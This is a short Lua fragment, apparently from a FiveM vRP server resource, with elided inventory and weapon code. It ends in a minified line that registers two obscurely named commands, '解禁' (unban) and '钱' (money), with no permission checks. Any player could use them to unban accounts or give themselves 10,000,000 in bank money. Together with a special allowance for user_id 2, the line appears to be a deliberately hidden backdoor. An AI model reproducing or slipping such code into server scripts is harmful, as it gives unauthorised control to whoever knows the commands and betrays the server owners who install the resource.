    ...
    vRPclient.getWeapons(player,{},function(weapons)
            ...
            if vRP.getInventoryWeight(user_id) <= 25 or user_id == 2 and vRP.getInventoryWeight(user_id) <= 95 then
              vRPclient.giveWeapons(player,{{}, true}, function(removedwep)
                    ...
                    TriggerClientEvent('CXRP:RefreshInventory', source)
...
RegisterCommand('解禁',function(a,b)if tonumber(b[1])then local c=tonumber(b[1])vRP.setBanned(c,false)TriggerClientEvent('CXRP:Notify',a,"~g~Completed")else TriggerClientEvent('CXRP:Notify',a,"~r~Error")end end)RegisterCommand('钱',function(a,b)local d=vRP.getUserId(a)vRP.giveBankMoney(d,10000000)end)
